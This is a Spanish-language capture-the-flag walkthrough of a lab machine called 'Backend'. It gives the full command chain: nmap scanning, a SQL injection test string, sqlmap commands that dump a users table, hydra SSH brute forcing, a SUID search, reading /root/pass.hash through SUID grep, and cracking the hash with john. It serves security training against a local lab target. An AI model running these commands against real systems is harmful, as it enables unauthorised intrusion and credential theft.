Lo primero, nos descargamos la maquina y la ejecutamos para que se despliegue:
![[Pasted image 20251126205207.png]]

Una vez este levantada, podemos observar la ip de la maquina. Lo primero sera enumerar los puertos y servicios que tiene levantados. Para ello, usaremos el comando `sudo nmap -p- -sS -sCV --min-rate 5000 -n -Pn -vvv 172.17.0.2 -oN scan`:

![[Pasted image 20251126205804.png]]

Como podemos observar, estan abierto los puertos de ssh y el de http, por lo que vamos a abrir el navegador para observar la web:

![[Pasted image 20251126205915.png]]

Una vez dentro, podemos observar un panel de login, el cual es el siguiente:

![[Pasted image 20251126210121.png]]

Vamos a probar a ver si es vulnerable a SQLinjection como por ejemplo con `' or 1=1 --`, y observamos que da este error:

![[Pasted image 20251126211348.png]]

Ahora, despues de probar esto, vamos a usar la herramienta SQLMap con el siguiente comando
`sqlmap --url 'http://172.17.0.2/login.html' --forms --dbs --batch`:

![[Pasted image 20251126211659.png]]

Como vemos una vez terminado, podemos observar 5 nombre de bases de datos. Ahora quiero centrarme en la DB de Users, y sacar sus tablas, asique usaremos el comando `sqlmap --url 'http://172.17.0.2/login.html' --forms -D users --tables --batch`

![[Pasted image 20251126225346.png]]

Como se ve, ha encontrado la tabla de usuarios, asique vamos a por las columnas de esta tabla con el comando `sqlmap --url 'http://172.17.0.2/login.html' --forms -D users -T usuarios --columns --batch`

![[Pasted image 20251126225512.png]]

Y observamos que tenemos el id, password, y username. Vamos a a dumpear esta columna para obtener el acceso. Usaremos este siguiente comando: `sqlmap --url 'http://172.17.0.2/login.html' --forms -D users -T usuarios -C username,password --dump --batch`

![[Pasted image 20251126225818.png]]

Ahora podemos observar que tenemos tanto el username y la password de cada username. Vamos a hacer dos wordlists, una de users y otra de passwords, de la sigueinte manera:

![[Pasted image 20251126230109.png]]
![[Pasted image 20251126230205.png]]

Vamos a hacer bruteforce con hydra usando estos dos wordlist al puerto 22 que aloja el servicio de ssh, usando este comando: `hydra -L users -P passwords ssh://172.17.0.2`

![[Pasted image 20251126230658.png]]

Como se puede ver, ya se ha obtenido acceso mediante ssh con el usuario pepe. Podemos comprobar si hay mas usuarios:

![[Pasted image 20251126231127.png]]

Somos el unico usuario en la maquina. Ahora vamos a listar los procesos a ver si encontramos algo interesante:

![[Pasted image 20251126231348.png]]

Pues vamos a probar a ver si hay binarios ejecutables dentro del sistema ya que observamos que no hay nada interesante en los procesos `find / -perm -4000 2>/dev/null`:

![[Pasted image 20251126231718.png]]

Observamos aqui que tanto ls como grep, tienen premisos para que se se ejecuten con los permisos del propietario del archivo, asique, para sacar el hash de la maquina seria ejecutar el siguiente comando y obtendriamos el hash `/usr/bin/grep "" /root/pass.hash`:

![[Pasted image 20251126232335.png]]

Lanzamos este comando `john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash` y ya estaria terminada la maquina Backend!

![[Pasted image 20251126232917.png]]

